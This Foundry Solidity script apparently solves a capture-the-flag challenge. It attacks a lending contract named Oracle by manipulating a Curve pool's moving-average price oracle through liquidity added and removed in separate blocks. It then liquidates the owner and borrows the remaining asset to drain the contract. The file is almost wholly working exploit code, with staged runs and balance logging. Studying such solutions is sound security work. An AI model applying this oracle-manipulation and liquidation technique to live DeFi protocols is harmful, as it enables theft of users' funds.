
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Oracle.sol";

contract OracleSolve is Script {
    Oracle public oracle = Oracle(0xBDe3f5259Ea4f3f80bB7B9d30f8e7f65747b22Af);
    address player = vm.envAddress("PLAYER");
    SimplePriceOracle public simplePriceOracle;
    CurvePriceOracle public curvePriceOracle;
    ICurve public curvePool;

/// Note
/*
@external
@view
@nonreentrant('lock')
def price_oracle(i: uint256) -> uint256:
    return self._calc_moving_average(
        self.last_prices_packed[i],
        self.ma_exp_time,
        self.ma_last_time & (2**128 - 1)
    )

Price_oracle is volatile and dependent on ma_last_time, ma_last_time

GOAL :  - Increase price of asset 1 by adding liquidity and removing liquidity in different blocks
        - and liquidate owner and get his 10000 ether balance of asset0 and 
        - Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1
*/
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        simplePriceOracle = SimplePriceOracle(oracle.priceOracles(0));
        curvePriceOracle = CurvePriceOracle(oracle.priceOracles(1)); // curvePool Oracle is for asset 1 
        curvePool = ICurve(curvePriceOracle.curvePool());

        console.log("Player : ", oracle.player());
        console.log("assetCount : ", oracle.assetCount());

        console.log("-------------------------------------");
        (IERC20 assetToken0, uint256 totalDeposited0, uint256 totalBorrowed0, uint256 baseRate0 ) = oracle.assets(0);
        console.log("asset0 address: ", address(assetToken0));
        console.log("asset0 totalDeposited0 : ", totalDeposited0);
        console.log("asset0 totalBorrowed0 : ", totalBorrowed0);
        console.log("asset0 baseRate0 : ", baseRate0);
        console.log("asset0 priceOracle : ", oracle.priceOracles(0));

        console.log("-------------------------------------");
        (IERC20 assetToken1, uint256 totalDeposited1, uint256 totalBorrowed1, uint256 baseRate1 ) = oracle.assets(1);
        console.log("asset1 address: ", address(assetToken1));
        console.log("asset1 totalDeposited1 : ", totalDeposited1);
        console.log("asset1 totalBorrowed1 : ", totalBorrowed1);
        console.log("asset1 baseRate1 : ", baseRate1);
        console.log("asset1 priceOracle : ", oracle.priceOracles(1));
        
        console.log("---------------Owner-----------------");
        // (uint256 O_deposited0, uint256 O_borrowed0, uint256 O_lastInterestedBlock0) = oracle.getUserAccount(oracle.owner(), 0, 0 , 0);
        // console.log("deposited0 : ", O_deposited0);
        // console.log("borrowed0 : ", O_borrowed0);
        // console.log("lastInterestedBlock0 : ", O_lastInterestedBlock0);

        // (uint256 O_deposited1, uint256 O_borrowed1, uint256 O_lastInterestedBlock1) = oracle.getUserAccount(oracle.owner(), 1, 1 , 1);
        // console.log("deposited1 : ", O_deposited1);
        // console.log("borrowed1 : ", O_borrowed1);
        // console.log("lastInterestedBlock1 : ", O_lastInterestedBlock1);

        console.log("asset0 balance : ", assetToken0.balanceOf(oracle.owner()));
        console.log("asset1 balance : ", assetToken1.balanceOf(oracle.owner()));

        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
        
        console.log("---------------Player-----------------");
        // (uint256 P_deposited0, uint256 P_borrowed0, uint256 P_lastInterestedBlock0) = oracle.getUserAccount(player, 0, 0 , 0);
        // console.log("deposited0 : ", P_deposited0);
        // console.log("borrowed0 : ", P_borrowed0);
        // console.log("lastInterestedBlock0 : ", P_lastInterestedBlock0);

        // (uint256 P_deposited1, uint256 P_borrowed1, uint256 P_lastInterestedBlock1) = oracle.getUserAccount(player, 1, 1 , 1);
        // console.log("deposited1 : ", P_deposited1);
        // console.log("borrowed1 : ", P_borrowed1);
        // console.log("lastInterestedBlock1 : ", P_lastInterestedBlock1);

        console.log("asset0 balance : ", assetToken0.balanceOf(player));
        console.log("asset1 balance : ", assetToken1.balanceOf(player));
        
        
        console.log("-------------Price Oracles---------------");
        console.log("simplePriceOracle: ", address(simplePriceOracle));
        console.log("simplePriceOracle asset0 Price : ", simplePriceOracle.getAssetPrice(0));
        // console.log("simplePriceOracle asset1 Price : ", simplePriceOracle.getAssetPrice(1));

        console.log("curvePriceOracle (asset 1): ", address(curvePriceOracle));
        console.log("curvePriceOracle Curve Pool : ", address(curvePool));
        // console.log("Curve asset0 Price : ", curvePriceOracle.getAssetPrice(0));
        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
        console.log("-------------------------------------");

        console.log("token 0 in curve pool : ", curvePool.coins(0));
        console.log("token 1 in curve pool : ", curvePool.coins(1));


        // Goal is to reduce the price of asset 1 in the pool
        uint256 amountOfAsset0 = assetToken0.balanceOf(player);
        uint256 amountOfAsset1 = assetToken1.balanceOf(player);


        /// RUN - 1, RUN - 2
        // uint256[] memory amountsToAdd = new uint256[](2);
        // amountsToAdd[0] = amountOfAsset0/2;
        // amountsToAdd[1] = 0;
        // assetToken0.approve(address(curvePool), amountOfAsset0);
        // curvePool.add_liquidity(amountsToAdd, 0);
        // console.log("LP balance of Player : ", curvePool.balanceOf(player));

        /// RUN - 3
        // uint256[] memory amountsToRemove = new uint256[](2);
        // amountsToRemove[0] = 9999 ether;
        // amountsToRemove[1] = 0;
        // curvePool.approve(address(curvePool), curvePool.balanceOf(player));
        // curvePool.remove_liquidity_imbalance(amountsToRemove, curvePool.balanceOf(player));

        /// RUN - 4
        // assetToken1.approve(address(oracle), amountOfAsset1);
        // oracle.liquidate(oracle.owner(), 1, amountOfAsset1, 0);
        
        /// RUN - 5
        assetToken1.approve(address(oracle), amountOfAsset1);
        oracle.deposit(1, amountOfAsset1);
        oracle.borrow(0, 1 ether);

        console.log("LP balance of Player : ", curvePool.balanceOf(player));
        console.log("asset0 balance : ", assetToken0.balanceOf(player));
        console.log("asset1 balance : ", assetToken1.balanceOf(player));

        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
        
        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());


        vm.stopBroadcast();

    }
}


